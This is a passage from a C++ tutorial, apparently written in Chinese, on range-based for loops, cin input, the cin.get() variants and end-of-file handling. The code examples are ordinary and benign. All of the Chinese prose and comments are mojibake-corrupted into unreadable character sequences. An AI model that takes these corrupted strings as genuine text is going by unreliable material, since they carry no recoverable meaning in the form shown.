éå†åˆå§‹åŒ–åˆ—è¡¨ std::cout &lt;&lt; &quot;Initializer list:&quot;; for (int x : &#123;10, 20, 30, 40&#125;) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; x; &#125; std::cout &lt;&lt; std::endl; // 5. ä½¿ç”¨ auto ç®€åŒ–å£°æ˜ std::array&lt;std::string, 3&gt; fruits &#123;&quot;Apple&quot;, &quot;Banana&quot;, &quot;Cherry&quot;&#125;; std::cout &lt;&lt; &quot;Fruits (array with auto):&quot;; for (auto fruit : fruits) &#123; // fruit æ˜¯ std::string çš„å‰¯æœ¬ std::cout &lt;&lt; &quot; &quot; &lt;&lt; fruit; &#125; std::cout &lt;&lt; std::endl; // 6. ä½¿ç”¨å¼•ç”¨ä¿®æ”¹å…ƒç´  (auto&amp;) std::vector&lt;int&gt; scores = &#123;70, 85, 90&#125;; std::cout &lt;&lt; &quot;Original scores:&quot;; for (int score : scores) std::cout &lt;&lt; &quot; &quot; &lt;&lt; score; std::cout &lt;&lt; std::endl; for (auto&amp; score_ref : scores) &#123; // score_ref æ˜¯å…ƒç´ çš„å¼•ç”¨ score_ref += 5; // ç»™æ¯ä¸ªåˆ†æ•°åŠ  5 &#125; std::cout &lt;&lt; &quot;Scores after adding 5:&quot;; for (int score : scores) std::cout &lt;&lt; &quot; &quot; &lt;&lt; score; // è¾“å‡ºä¿®æ”¹åçš„åˆ†æ•° std::cout &lt;&lt; std::endl; // 7. ä½¿ç”¨å¸¸é‡å¼•ç”¨è¿›è¡Œåªè¯»è®¿é—® (const auto&amp;) std::cout &lt;&lt; &quot;Reading scores (const auto&amp;):&quot;; for (const auto&amp; score_cref : scores) &#123; // score_cref += 1; // é”™è¯¯! ä¸èƒ½é€šè¿‡å¸¸é‡å¼•ç”¨ä¿®æ”¹ std::cout &lt;&lt; &quot; &quot; &lt;&lt; score_cref; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; ä¼˜ç‚¹: ç®€æ´: ä»£ç æ›´çŸ­ï¼Œæ„å›¾æ›´æ¸…æ™°ï¼ˆâ€œå¯¹èŒƒå›´ä¸­çš„æ¯ä¸ªå…ƒç´ åšæŸäº‹â€ï¼‰ã€‚ å®‰å…¨: é¿å…äº†æ‰‹åŠ¨ç®¡ç†ç´¢å¼•æˆ–è¿­ä»£å™¨å¯èƒ½å¯¼è‡´çš„é”™è¯¯ï¼ˆå¦‚è¶Šç•Œè®¿é—®ã€è¿­ä»£å™¨å¤±æ•ˆç­‰ï¼‰ã€‚ é€šç”¨: é€‚ç”¨äºæ‰€æœ‰å®šä¹‰äº† begin() å’Œ end() çš„æ ‡å‡†å®¹å™¨ä»¥åŠå†…ç½®æ•°ç»„å’Œåˆå§‹åŒ–åˆ—è¡¨ã€‚ å±€é™æ€§: æ— æ³•ç›´æ¥è·å–ç´¢å¼•: å¦‚æœåœ¨å¾ªç¯ä¸­éœ€è¦çŸ¥é“å½“å‰å…ƒç´ çš„ç´¢å¼•ï¼ŒåŸºäºèŒƒå›´çš„ for å¾ªç¯æœ¬èº«ä¸æä¾›è¿™ä¸ªä¿¡æ¯ã€‚éœ€è¦é¢å¤–ç»´æŠ¤ä¸€ä¸ªè®¡æ•°å™¨å˜é‡ã€‚ 123456std::vector&lt;int&gt; data = &#123;100, 200, 300&#125;;int index = 0;for (int val : data) &#123; std::cout &lt;&lt; &quot;Index &quot; &lt;&lt; index &lt;&lt; &quot;: &quot; &lt;&lt; val &lt;&lt; std::endl; index++;&#125; éå†æ•´ä¸ªèŒƒå›´: å®ƒæ€»æ˜¯ä»å¤´åˆ°å°¾éå†æ•´ä¸ªèŒƒå›´ã€‚å¦‚æœéœ€è¦æ›´å¤æ‚çš„éå†æ¨¡å¼ï¼ˆå¦‚åå‘ã€è·³è·ƒã€åªéå†éƒ¨åˆ†èŒƒå›´ï¼‰ï¼Œä¼ ç»Ÿçš„ for å¾ªç¯æˆ– while å¾ªç¯é…åˆè¿­ä»£å™¨å¯èƒ½æ›´åˆé€‚ã€‚ ä¿®æ”¹å®¹å™¨å¤§å°: åœ¨å¾ªç¯ä½“å†…ä¿®æ”¹å®¹å™¨çš„å¤§å°ï¼ˆä¾‹å¦‚ï¼Œåœ¨ vector ä¸­ push_back æˆ– eraseï¼‰é€šå¸¸æ˜¯ä¸å®‰å…¨çš„ï¼Œå¯èƒ½å¯¼è‡´è¿­ä»£å™¨å¤±æ•ˆå’Œæœªå®šä¹‰è¡Œä¸ºã€‚åŸºäºèŒƒå›´çš„ for å¾ªç¯ä¸é€‚åˆè¿™ç§æƒ…å†µã€‚ æ€»ç»“: åŸºäºèŒƒå›´çš„ for å¾ªç¯æ˜¯ C++11 æä¾›çš„ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„ç‰¹æ€§ï¼Œæå¤§åœ°ç®€åŒ–äº†å¯¹åºåˆ—ä¸­æ‰€æœ‰å…ƒç´ çš„éå†æ“ä½œã€‚åœ¨ä¸éœ€è¦ç´¢å¼•ä¸”éœ€è¦éå†æ•´ä¸ªåºåˆ—çš„æƒ…å†µä¸‹ï¼Œå®ƒé€šå¸¸æ˜¯æ¯”ä¼ ç»Ÿ for å¾ªç¯æ›´ä¼˜é€‰ã€æ›´å®‰å…¨ã€æ›´æ˜“è¯»çš„é€‰æ‹©ã€‚ 5.5 å¾ªç¯å’Œæ–‡æœ¬è¾“å…¥å¾ªç¯ç»“æ„åœ¨å¤„ç†æ–‡æœ¬è¾“å…¥æ—¶éå¸¸æœ‰ç”¨ï¼Œç‰¹åˆ«æ˜¯å½“æˆ‘ä»¬éœ€è¦é€ä¸ªå­—ç¬¦æˆ–é€è¡Œè¯»å–æ•°æ®ï¼Œç›´åˆ°æ»¡è¶³æŸä¸ªæ¡ä»¶ï¼ˆå¦‚é‡åˆ°ç‰¹å®šå­—ç¬¦ã€æ–‡ä»¶ç»“æŸæˆ–è¾¾åˆ°ä¸€å®šæ•°é‡ï¼‰æ—¶ã€‚æœ¬èŠ‚å°†æ¢è®¨ä½¿ç”¨ cin åŠå…¶ç›¸å…³æ–¹æ³•è¿›è¡Œæ–‡æœ¬è¾“å…¥çš„å¸¸è§æ¨¡å¼å’ŒæŠ€å·§ã€‚ 5.5.1 ä½¿ç”¨åŸå§‹çš„cinè¿›è¡Œè¾“å…¥æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œä½¿ç”¨ cin &gt;&gt; variable å¯ä»¥ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ã€‚å½“ç”¨äºè¯»å–æ–‡æœ¬ï¼ˆå¦‚ char æˆ– stringï¼‰æ—¶ï¼Œcin &gt;&gt; çš„è¡Œä¸ºç‰¹ç‚¹æ˜¯ï¼š è·³è¿‡ç©ºç™½: å®ƒä¼šè‡ªåŠ¨å¿½ç•¥è¾“å…¥æµä¸­å¼€å¤´çš„ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ã€‚ è¯»å–ç›´åˆ°ç©ºç™½: å®ƒä¼šè¯»å–éç©ºç™½å­—ç¬¦ï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªç©ºç™½å­—ç¬¦ä¸ºæ­¢ã€‚ ç©ºç™½ç¬¦ç•™åœ¨æµä¸­: åœæ­¢è¯»å–æ—¶é‡åˆ°çš„é‚£ä¸ªç©ºç™½å­—ç¬¦ä¼šç•™åœ¨è¾“å…¥æµï¼ˆè¾“å…¥ç¼“å†²åŒºï¼‰ä¸­ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡è¯»å–æ“ä½œã€‚ è¿™ä½¿å¾— cin &gt;&gt; é€‚åˆè¯»å–å•ä¸ªå•è¯æˆ–ä»¥ç©ºç™½åˆ†éš”çš„æ•°æ®é¡¹ï¼Œä½†ä¸é€‚åˆè¯»å–åŒ…å«ç©ºæ ¼çš„æ•´è¡Œæ–‡æœ¬æˆ–ç²¾ç¡®åœ°é€ä¸ªå­—ç¬¦å¤„ç†ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; char ch; std::string word; std::cout &lt;&lt; &quot;Enter some characters (e.g., &#x27;a b c&#x27;): &quot;; // è¯»å–ç¬¬ä¸€ä¸ªéç©ºç™½å­—ç¬¦ std::cin &gt;&gt; ch; std::cout &lt;&lt; &quot;First char read: &#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; // å¦‚æœè¾“å…¥ &quot; a b c&quot;, è¿™é‡Œä¼šè¯»åˆ° &#x27;a&#x27; // è¯»å–ä¸‹ä¸€ä¸ªå•è¯ std::cin &gt;&gt; word; std::cout &lt;&lt; &quot;Next word read: \\&quot;&quot; &lt;&lt; word &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // ä¼šè¯»åˆ° &quot;b&quot; // å†æ¬¡è¯»å–å­—ç¬¦ std::cin &gt;&gt; ch; std::cout &lt;&lt; &quot;Next char read: &#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; // ä¼šè¯»åˆ° &#x27;c&#x27; // å¾ªç¯è¯»å–å•è¯ç›´åˆ°è¾“å…¥ç»“æŸ (ä¾‹å¦‚æŒ‰ Ctrl+Z/Ctrl+D) std::cout &lt;&lt; &quot;\\nEnter words (Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; while (std::cin &gt;&gt; word) &#123; // cin &gt;&gt; word åœ¨æˆåŠŸè¯»å–æ—¶è¿”å› true std::cout &lt;&lt; &quot;Read word: &quot; &lt;&lt; word &lt;&lt; std::endl; &#125; // æ³¨æ„ï¼šå¾ªç¯ç»“æŸåï¼Œcin å¯èƒ½å¤„äºå¤±è´¥çŠ¶æ€ return 0;&#125; while (std::cin &gt;&gt; word) æ˜¯ä¸€ç§å¸¸è§çš„è¯»å–æ¨¡å¼ï¼Œå®ƒåˆ©ç”¨äº† cin å¯¹è±¡åœ¨æˆåŠŸè¯»å–æ—¶å¯ä»¥è¢«è½¬æ¢ä¸º true çš„ç‰¹æ€§ã€‚å½“è¯»å–å¤±è´¥ï¼ˆä¾‹å¦‚åˆ°è¾¾æ–‡ä»¶æœ«å°¾æˆ–é‡åˆ°æ— æ•ˆè¾“å…¥ï¼‰æ—¶ï¼Œcin å¯¹è±¡ä¼šè½¬æ¢ä¸º falseï¼Œå¾ªç¯ç»ˆæ­¢ã€‚ 5.5.2 ä½¿ç”¨cin.get(char)è¿›è¡Œè¡¥æ•‘cin &gt;&gt; è·³è¿‡ç©ºç™½å¹¶åœæ­¢äºç©ºç™½çš„è¡Œä¸ºæœ‰æ—¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œç‰¹åˆ«æ˜¯å½“æˆ‘ä»¬éœ€è¦è¯»å–åŒ…æ‹¬ç©ºæ ¼åœ¨å†…çš„æ¯ä¸€ä¸ªå­—ç¬¦æ—¶ã€‚cin.get(char&amp; ch) æˆå‘˜å‡½æ•°æä¾›äº†è§£å†³æ–¹æ¡ˆã€‚ cin.get(char&amp; ch): å°è¯•ä»è¾“å…¥æµä¸­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼ˆæ— è®ºå®ƒæ˜¯ä»€ä¹ˆï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ã€‚ å¦‚æœæˆåŠŸè¯»å–ï¼Œå°†è¯¥å­—ç¬¦å­˜å‚¨åœ¨å‚æ•° ch ä¸­ï¼Œå¹¶è¿”å› cin å¯¹è±¡æœ¬èº«ï¼ˆå¯ä»¥è½¬æ¢ä¸º trueï¼‰ã€‚ å¦‚æœåˆ°è¾¾æ–‡ä»¶æœ«å°¾æˆ–å‘ç”Ÿé”™è¯¯ï¼Œä¸ä¿®æ”¹ chï¼Œå¹¶å°† cin ç½®äºå¤±è´¥çŠ¶æ€ï¼ˆè½¬æ¢ä¸º falseï¼‰ã€‚ è¿™ä½¿å¾— cin.get(char) éå¸¸é€‚åˆåœ¨å¾ªç¯ä¸­é€ä¸ªè¯»å–æ‰€æœ‰å­—ç¬¦ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; char ch; int count = 0; std::cout &lt;&lt; &quot;Enter text (Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; // å¾ªç¯è¯»å–æ¯ä¸€ä¸ªå­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºç™½ç¬¦ while (std::cin.get(ch)) &#123; // å°è¯•è¯»å–ä¸€ä¸ªå­—ç¬¦åˆ° ch // æˆåŠŸè¯»å–ï¼Œå¤„ç†å­—ç¬¦ ch std::cout &lt;&lt; ch; // é€ä¸ªå­—ç¬¦å›æ˜¾ count++; &#125; std::cout &lt;&lt; &quot;\\n--- End of input ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Total characters read: &quot; &lt;&lt; count &lt;&lt; std::endl; return 0;&#125; è¿™ä¸ªå¾ªç¯ä¼šè¯»å–å¹¶å›æ˜¾ç”¨æˆ·è¾“å…¥çš„æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼å’Œæ¢è¡Œï¼Œç›´åˆ°é‡åˆ°æ–‡ä»¶ç»“æŸç¬¦ã€‚ 5.5.3 ä½¿ç”¨å“ªä¸ªcin.get()istream ç±»ï¼ˆcin æ˜¯å…¶å¯¹è±¡ï¼‰å®é™…ä¸Šæä¾›äº†å‡ ä¸ªåä¸º get çš„æˆå‘˜å‡½æ•°ï¼ˆå‡½æ•°é‡è½½ï¼‰ï¼š cin.get(char&amp; ch): (å·²åœ¨ 5.5.2 è®¨è®º) è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦åˆ°å‚æ•° ch ä¸­ã€‚ è¿”å› cin å¯¹è±¡ã€‚ é€‚åˆåœ¨ while æ¡ä»¶ä¸­ç›´æ¥ä½¿ç”¨ while(cin.get(ch))ã€‚ cin.get(): (æ— å‚æ•°ç‰ˆæœ¬) è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚ è¿”å›è¯¥å­—ç¬¦çš„æ•´æ•° ASCII ç ï¼ˆæˆ– wchar_t å¯¹åº”çš„å€¼ï¼‰ã€‚ å¦‚æœåˆ°è¾¾æ–‡ä»¶æœ«å°¾æˆ–å‘ç”Ÿé”™è¯¯ï¼Œè¿”å›ç‰¹æ®Šå€¼ EOF (End Of Fileï¼Œé€šå¸¸å®šä¹‰ä¸º -1ï¼Œåœ¨ &lt;iostream&gt; æˆ– &lt;cstdio&gt; ä¸­å®šä¹‰)ã€‚ ä¸ç›´æ¥å°†å­—ç¬¦å­˜å…¥å˜é‡ï¼Œéœ€è¦æ¥æ”¶å…¶è¿”å›å€¼ã€‚ é€‰æ‹©ä¾æ®: cin.get(char&amp; ch): å½“ä½ éœ€è¦å°†è¯»å–çš„å­—ç¬¦ç›´æ¥å­˜å‚¨åˆ°ä¸€ä¸ª char å˜é‡ä¸­ï¼Œå¹¶ä¸”æƒ³åˆ©ç”¨ cin å¯¹è±¡åœ¨ while æ¡ä»¶ä¸­çš„å¸ƒå°”è½¬æ¢ç‰¹æ€§æ—¶ï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„é€‰æ‹©ã€‚ cin.get() (æ— å‚æ•°): å½“ä½ éœ€è¦æ˜¾å¼åœ°æ£€æŸ¥æ–‡ä»¶ç»“æŸç¬¦ EOF æ—¶ï¼Œæˆ–è€…å½“ä½ éœ€è¦è·å–å­—ç¬¦çš„æ•´æ•°å€¼æ—¶ï¼Œè¿™ä¸ªç‰ˆæœ¬æ›´åˆé€‚ã€‚è¿”å›å€¼éœ€è¦ä¸ EOF è¿›è¡Œæ¯”è¾ƒã€‚ ç”¨æ³•ä¸ç¤ºä¾‹ (cin.get() æ— å‚æ•°ç‰ˆæœ¬): 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;cstdio&gt; // ä¸ºäº† EOF (è™½ç„¶ iostream é€šå¸¸ä¹ŸåŒ…å«)int main() &#123; int ch_int; // æ³¨æ„ç±»å‹æ˜¯ intï¼Œä»¥æ¥æ”¶ EOF int count = 0; std::cout &lt;&lt; &quot;Enter text (Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; // å¾ªç¯è¯»å–ï¼Œç›´åˆ°é‡åˆ° EOF while ((ch_int = std::cin.get()) != EOF) &#123; // è¯»å–å­—ç¬¦çš„ int å€¼å¹¶ä¸ EOF æ¯”è¾ƒ // æˆåŠŸè¯»å– (ä¸æ˜¯ EOF) std::cout &lt;&lt; static_cast&lt;char&gt;(ch_int); // å°† int å€¼è½¬å› char è¿›è¡Œè¾“å‡º count++; &#125; std::cout &lt;&lt; &quot;\\n--- End of input ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Total characters read: &quot; &lt;&lt; count &lt;&lt; std::endl; return 0;&#125; ä¸¤ç§ get æ–¹æ³•éƒ½å¯ä»¥ç”¨äºé€å­—ç¬¦è¯»å–ï¼Œé€‰æ‹©å“ªç§å–å†³äºä½ å–œæ¬¢çš„åˆ¤æ–­å¾ªç¯ç»“æŸçš„æ–¹å¼ï¼ˆæ£€æŸ¥ cin çŠ¶æ€è¿˜æ˜¯æ£€æŸ¥ EOF è¿”å›å€¼ï¼‰ã€‚ 5.5.4 æ–‡ä»¶å°¾æ¡ä»¶å½“ä»è¾“å…¥æµï¼ˆå¦‚ cin æˆ–æ–‡ä»¶æµï¼‰è¯»å–æ•°æ®æ—¶ï¼Œæœ€ç»ˆä¼šåˆ°è¾¾è¾“å…¥çš„æœ«å°¾ï¼Œè¿™è¢«ç§°ä¸º**æ–‡ä»¶å°¾ (End-of-File, EOF)**ã€‚ç¨‹åºéœ€è¦èƒ½å¤Ÿæ£€æµ‹åˆ° EOF æ¡ä»¶ä»¥æ­£å¸¸ç»ˆæ­¢è¯»å–å¾ªç¯ã€‚ æœ‰å‡ ç§æ–¹æ³•å¯ä»¥æ£€æµ‹ EOFï¼š æ£€æŸ¥ cin çŠ¶æ€: cin å¯¹è±¡æœ¬èº«å¯ä»¥è½¬æ¢ä¸ºå¸ƒå°”å€¼ã€‚å½“è¯»å–æ“ä½œæˆåŠŸæ—¶ï¼Œå®ƒè½¬æ¢ä¸º trueï¼›å½“é‡åˆ° EOF æˆ–å…¶ä»–é”™è¯¯å¯¼è‡´è¯»å–å¤±è´¥æ—¶ï¼Œå®ƒè½¬æ¢ä¸º falseã€‚è¿™æ˜¯ while (cin &gt;&gt; word) å’Œ while (cin.get(ch)) èƒ½å¤Ÿå·¥ä½œçš„åŸå› ã€‚ cin.eof(): å¦‚æœæµæ˜¯å› ä¸ºåˆ°è¾¾æ–‡ä»¶æœ«å°¾è€Œå¤±è´¥ï¼Œæ­¤å‡½æ•°è¿”å› trueã€‚æ³¨æ„: eof() åªæœ‰åœ¨å°è¯•è¯»å–å¹¶å¤±è´¥åæ‰ä¼šå˜ä¸º trueã€‚ä¸èƒ½ç”¨å®ƒæ¥é¢„æµ‹ä¸‹ä¸€æ¬¡è¯»å–æ˜¯å¦ä¼šåˆ°è¾¾ EOFã€‚ cin.fail(): å¦‚æœå‘ç”Ÿäº†é EOF çš„ I/O é”™è¯¯ï¼ˆä¾‹å¦‚è¯»å–äº†æ— æ•ˆæ•°æ®ç±»å‹ï¼‰æˆ–åˆ°è¾¾ EOFï¼Œæ­¤å‡½æ•°è¿”å› trueã€‚ cin.good(): å¦‚æœæµå¤„äºæ­£å¸¸çŠ¶æ€ï¼ˆæ²¡æœ‰è®¾ç½® eofbit, failbit, badbitï¼‰ï¼Œè¿”å› trueã€‚ æ£€æŸ¥ cin.get() çš„è¿”å›å€¼: æ— å‚æ•°çš„ cin.get() åœ¨åˆ°è¾¾ EOF æ—¶è¿”å›ç‰¹æ®Šå€¼ EOFã€‚è¿™æ˜¯ while ((ch = cin.get()) != EOF) èƒ½å¤Ÿå·¥ä½œçš„åŸå› ã€‚ EOF çš„è§¦å‘: é”®ç›˜è¾“å…¥: é€šå¸¸é€šè¿‡æŒ‰ä¸‹ç‰¹å®šçš„ç»„åˆé”®æ¥æ¨¡æ‹Ÿ EOFï¼š Unix/Linux/macOS: Ctrl+D (é€šå¸¸éœ€è¦åœ¨è¡Œé¦–æŒ‰) Windows: Ctrl+Z (é€šå¸¸éœ€è¦åœ¨ä¸€è¡Œç»“æŸåæŒ‰ Enterï¼Œç„¶åå†æŒ‰ Ctrl+Z å†æŒ‰ Enter) æ–‡ä»¶è¾“å…¥: å½“è¯»å–æ“ä½œå°è¯•è¶Šè¿‡æ–‡ä»¶çš„æœ€åä¸€ä¸ªå­—èŠ‚æ—¶ï¼Œä¼šè§¦å‘ EOFã€‚ ç¤ºä¾‹ (ä½¿ç”¨ cin çŠ¶æ€): 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;int main() &#123; int number; int sum = 0; int count = 0; std::cout &lt;&lt; &quot;Enter numbers (non-number or Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; // å¾ªç¯è¯»å–ï¼Œç›´åˆ° cin å¤±è´¥ (EOF æˆ–ç±»å‹ä¸åŒ¹é…) while (std::cin &gt;&gt; number) &#123; sum += number; count++; &#125; std::cout &lt;&lt; &quot;\\n--- Input finished ---&quot; &lt;&lt; std::endl; // æ£€æŸ¥å¾ªç¯ç»“æŸçš„åŸå›  if (std::cin.eof()) &#123; std::cout &lt;&lt; &quot;Reason: End-of-File reached.&quot; &lt;&lt; std::endl; &#125; else if (std::cin.fail()) &#123; // fail() åœ¨ eof() æ—¶ä¹Ÿå¯èƒ½ä¸º trueï¼Œä½†è¿™é‡Œæˆ‘ä»¬æ’é™¤äº† eof // å¦‚æœæ˜¯å› ä¸ºç±»å‹ä¸åŒ¹é…ï¼ˆä¾‹å¦‚è¾“å…¥äº†å­—æ¯ï¼‰ï¼Œfail() ä¸º true, eof() ä¸º false std::cout &lt;&lt; &quot;Reason: Invalid input (non-number).&quot; &lt;&lt; std::endl; // å¯èƒ½éœ€è¦æ¸…é™¤é”™è¯¯çŠ¶æ€å¹¶å¿½ç•¥æ— æ•ˆè¾“å…¥ä»¥ç»§ç»­ // std::cin.clear(); // std::cin.ignore(10000, &#x27;\\n&#x27;); &#125; else if (std::cin.bad()) &#123; std::cout &lt;&lt; &quot;Reason: Unrecoverable stream error.&quot; &lt;&lt; std::endl; &#125; if (count &gt; 0) &#123; std::cout &lt;&lt; &quot;Read &quot; &lt;&lt; count &lt;&lt; &quot; numbers. Sum = &quot; &lt;&lt; sum &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;No valid numbers were entered.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; ç†è§£å¦‚ä½•æ£€æµ‹ EOF å¯¹äºç¼–å†™èƒ½æ­£ç¡®å¤„ç†è¾“å…¥ç»“æŸçš„å¾ªç¯è‡³å…³é‡è¦ã€‚æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯åˆ©ç”¨ cin å¯¹è±¡æˆ– cin.get() åœ¨ while æ¡ä»¶ä¸­çš„è¡Œä¸ºã€‚ 5.5.5 å¦ä¸€ä¸ªcin.get()ç‰ˆæœ¬é™¤äº†è¯»å–å•ä¸ªå­—ç¬¦çš„ get() å‡½æ•°å¤–ï¼Œistream è¿˜æä¾›äº†ç”¨äºè¯»å– C é£æ ¼å­—ç¬¦ä¸²ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰çš„ get() ç‰ˆæœ¬ï¼š cin.get(char* buffer, int size, char delimiter = &#39;\\n&#39;): ä»è¾“å…¥æµä¸­è¯»å–å­—ç¬¦ï¼Œå¹¶å°†å®ƒä»¬å­˜å‚¨åˆ° buffer æŒ‡å‘çš„å­—ç¬¦æ•°ç»„ä¸­ã€‚ æœ€å¤šè¯»å– size - 1 ä¸ªå­—ç¬¦ï¼ˆä¸ºæœ«å°¾çš„ç©ºå­—ç¬¦ \\0 ç•™å‡ºç©ºé—´ï¼‰ã€‚ å¦‚æœåœ¨è¯»å– size - 1 ä¸ªå­—ç¬¦ä¹‹å‰é‡åˆ° delimiter å­—ç¬¦ï¼Œåˆ™åœæ­¢è¯»å–ã€‚ delimiter å­—ç¬¦æœ¬èº«ä¸ä¼šè¢«è¯»å–åˆ° buffer ä¸­ï¼Œè€Œæ˜¯ä¼šç•™åœ¨è¾“å…¥æµä¸­ã€‚ (è¿™æ˜¯ä¸ getline çš„ä¸»è¦åŒºåˆ«ä¹‹ä¸€)ã€‚ è¯»å–ç»“æŸåï¼Œæ€»ä¼šåœ¨ buffer çš„æœ«å°¾æ·»åŠ ä¸€ä¸ªç©ºå­—ç¬¦ \\0ã€‚ è¿”å› cin å¯¹è±¡ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;const int BUFFER_SIZE = 20;int main() &#123; char name[BUFFER_SIZE]; char address[BUFFER_SIZE]; std::cout &lt;&lt; &quot;Enter your name (max &quot; &lt;&lt; BUFFER_SIZE - 1 &lt;&lt; &quot; chars): &quot;; // è¯»å–æœ€å¤š BUFFER_SIZE - 1 ä¸ªå­—ç¬¦ï¼Œæˆ–ç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ std::cin.get(name, BUFFER_SIZE); // æ£€æŸ¥è¯»å–æ˜¯å¦æˆåŠŸä»¥åŠæ˜¯å¦è¿˜æœ‰å‰©ä½™å­—ç¬¦ï¼ˆæ¢è¡Œç¬¦ï¼‰ if (std::cin) &#123; // æ£€æŸ¥æµçŠ¶æ€æ˜¯å¦è‰¯å¥½ std::cout &lt;&lt; &quot;Name entered: &quot; &lt;&lt; name &lt;&lt; std::endl; // é—®é¢˜ï¼šæ¢è¡Œç¬¦ &#x27;\\n&#x27; ä»ç„¶ç•™åœ¨è¾“å…¥æµä¸­ï¼ // å¦‚æœç›´æ¥è°ƒç”¨ä¸‹ä¸€ä¸ª get æˆ– getlineï¼Œå®ƒä¼šç«‹å³è¯»åˆ°æ¢è¡Œç¬¦ // å¤„ç†æ®‹ç•™çš„æ¢è¡Œç¬¦ // æ–¹æ³•1: è¯»å–å¹¶ä¸¢å¼ƒå•ä¸ªå­—ç¬¦ (å¦‚æœæ˜¯æ¢è¡Œç¬¦) if (std::cin.peek() == &#x27;\\n&#x27;) &#123; // peek() æŸ¥çœ‹ä¸‹ä¸€ä¸ªå­—ç¬¦ä½†ä¸è¯»å– std::cin.ignore(); // è¯»å–å¹¶ä¸¢å¼ƒä¸€ä¸ªå­—ç¬¦ &#125; // æ–¹æ³•2: è¯»å–å¹¶ä¸¢å¼ƒç›´åˆ°æ¢è¡Œç¬¦ (æ›´é€šç”¨) // std::cin.ignore(10000, &#x27;\\n&#x27;); std::cout &lt;&lt; &quot;Enter your address (max &quot; &lt;&lt; BUFFER_SIZE - 1 &lt;&lt; &quot; chars): &quot;; std::cin.get(address, BUFFER_SIZE); if (std::cin) &#123; std::cout &lt;&lt; &quot;Address entered: &quot; &lt;&lt; address &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Error reading address or EOF reached.&quot; &lt;&lt; std::endl; &#125; &#125; else &#123; std::cout &lt;&lt; &quot;Error reading name or EOF reached.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; ä¸ getline(cin, string) çš„æ¯”è¾ƒ: cin.get(buffer, size): ç”¨äº C é£æ ¼å­—ç¬¦æ•°ç»„ã€‚ éœ€è¦æŒ‡å®šç¼“å†²åŒºå¤§å°ä»¥é˜²æ­¢æº¢å‡ºã€‚ ä¸è¯»å–åˆ†éš”ç¬¦ï¼Œåˆ†éš”ç¬¦ç•™åœ¨æµä¸­ã€‚ éœ€è¦æ‰‹åŠ¨å¤„ç†ç•™åœ¨æµä¸­çš„åˆ†éš”ç¬¦ã€‚ getline(cin, str): ç”¨äº std::string å¯¹è±¡ã€‚ è‡ªåŠ¨ç®¡ç†å†…å­˜ï¼Œæ— éœ€æ‹…å¿ƒç¼“å†²åŒºæº¢å‡ºã€‚ è¯»å–å¹¶ä¸¢å¼ƒåˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸º \\nï¼‰ã€‚ é€šå¸¸æ›´æ–¹ä¾¿ã€æ›´å®‰å…¨ã€‚ ç”±äº cin.get(buffer, size) ä¸è¯»å–åˆ†éš”ç¬¦å¹¶å°†å…¶ç•™åœ¨æµä¸­ï¼Œè¿™å¸¸å¸¸å¯¼è‡´åç»­è¾“å…¥å‡ºç°é—®é¢˜ã€‚å› æ­¤ï¼Œåœ¨ç°ä»£ C++ ä¸­ï¼Œå½“éœ€è¦è¯»å–æ•´è¡Œæ–‡æœ¬æ—¶ï¼Œ**å¼ºçƒˆæ¨èä½¿ç”¨ getline(cin, std::string)**ã€‚cin.get(buffer, size) ä¸»è¦ç”¨äºéœ€è¦ä¸ C é£æ ¼å­—ç¬¦ä¸² API äº¤äº’æˆ–æœ‰ç‰¹å®šé™åˆ¶çš„åœºæ™¯ã€‚ 5.6 åµŒå¥—å¾ªç¯å’ŒäºŒç»´æ•°ç»„åµŒå¥—å¾ªç¯ (Nested Loop) 